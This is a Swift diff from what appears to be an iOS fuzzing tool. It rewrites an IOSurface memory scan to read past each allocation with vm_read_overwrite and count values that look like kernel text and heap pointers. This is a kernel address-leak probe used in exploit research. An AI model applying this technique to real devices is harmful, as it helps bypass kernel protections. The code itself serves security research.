@@ -1763,16 +1763,24 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
 
         surface.unlock(options: [], seed: nil)
 
-        // Scan 1: pixel backing store + 4KB tail residue (allocator may not zero tail)
-        step("GPU done — scanning backing store (alloc=\(allocSize) + 4KB tail)")
-        func scanRegion(_ label: String, _ ptr: UnsafeRawPointer?, _ len: Int) {
-            guard let ptr = ptr, len >= 8 else { step("  \(label): nil/too small"); return }
-            let raw = ptr.assumingMemoryBound(to: UInt8.self)
-            var found = 0
-            var ktext = 0, kheap = 0, kmmio = 0
-            for qw in 0..<(len / 8) {
+        step("GPU done — scanning IOSurface regions via vm_read_overwrite (crash-safe)")
+
+        // vm_read_overwrite bounce buffer scan — kernel fault handler returns error on unmapped pages
+        func scanAddr(_ label: String, _ startAddr: UInt, _ scanLen: Int) {
+            var buf = [UInt8](repeating: 0, count: scanLen)
+            var outBytes: vm_size_t = 0
+            let kr: kern_return_t = buf.withUnsafeMutableBytes { b in
+                vm_read_overwrite(mach_task_self_,
+                                  vm_address_t(startAddr),
+                                  vm_size_t(scanLen),
+                                  vm_address_t(bitPattern: b.baseAddress!),
+                                  &outBytes)
+            }
+            guard kr == 0 else { step("  \(label): vm_read kr=\(kr)"); return }
+            var found = 0, ktext = 0, kheap = 0, kmmio = 0
+            for qw in 0..<(Int(outBytes) / 8) {
                 var val: UInt64 = 0
-                for b in 0..<8 { val |= UInt64(raw[qw*8 + b]) << (b*8) }
+                for b in 0..<8 { val |= UInt64(buf[qw*8 + b]) << (b*8) }
                 guard val >= 0xFFFFFE0000000000 && val != 0xFFFFFFFFFFFFFFFF else { continue }
                 let b0 = UInt8(val & 0xFF)
                 guard val != UInt64(b0) &* 0x0101010101010101 else { continue }
@@ -1793,16 +1801,22 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
             step("  \(label) total: KTEXT=\(ktext) KHEAP=\(kheap) KMMIO=\(kmmio)")
         }
 
-        // Clamp to allocationSize — iOS does NOT map pages beyond it, causes crash
-        scanRegion("pixel+tail", baseAddr, allocSize)
+        let base = UInt(bitPattern: baseAddr)
 
-        // Scan 2: re-lock — kernel updates lock-state metadata bytes in backing store
+        // Scan 1: mapped allocation (safe)
+        scanAddr("alloc", base, allocSize)
+
+        // Scan 2: 64KB tail past allocation — kernel heap residue, safe via vm_read
+        scanAddr("alloc_tail", base + UInt(allocSize), 65536)
+
+        // Scan 3: re-lock — kernel writes lock-state metadata into backing store
         var seed2: UInt32 = 0
         surface.lock(options: [], seed: &seed2)
         surface.unlock(options: [], seed: nil)
-        scanRegion("post_relock", surface.baseAddress, allocSize)
+        scanAddr("post_relock", base, allocSize)
+        scanAddr("post_relock_tail", base + UInt(allocSize), 65536)
 
-        // Scan 3: second IOSurface — allocator may hand back same physical pages
+        // Scan 4: second IOSurface — allocator residue from freed pages
         let props2: [IOSurfacePropertyKey: Any] = [
             .width: 256, .height: 4, .bytesPerElement: 4, .bytesPerRow: 1024,
             .pixelFormat: 0x42475241
@@ -1811,7 +1825,9 @@ func runIOSurfaceLeak(log: FuzzLog, completion: @escaping () -> Void) {
             var seed3: UInt32 = 0
             surf2.lock(options: [], seed: &seed3)
             surf2.unlock(options: [], seed: nil)
-            scanRegion("reuse_alloc", surf2.baseAddress, surf2.allocationSize)
+            let base2 = UInt(bitPattern: surf2.baseAddress)
+            scanAddr("reuse_alloc", base2, surf2.allocationSize)
+            scanAddr("reuse_tail", base2 + UInt(surf2.allocationSize), 65536)
         }
 
         step("── IOSurface Leak complete ─────────────────")
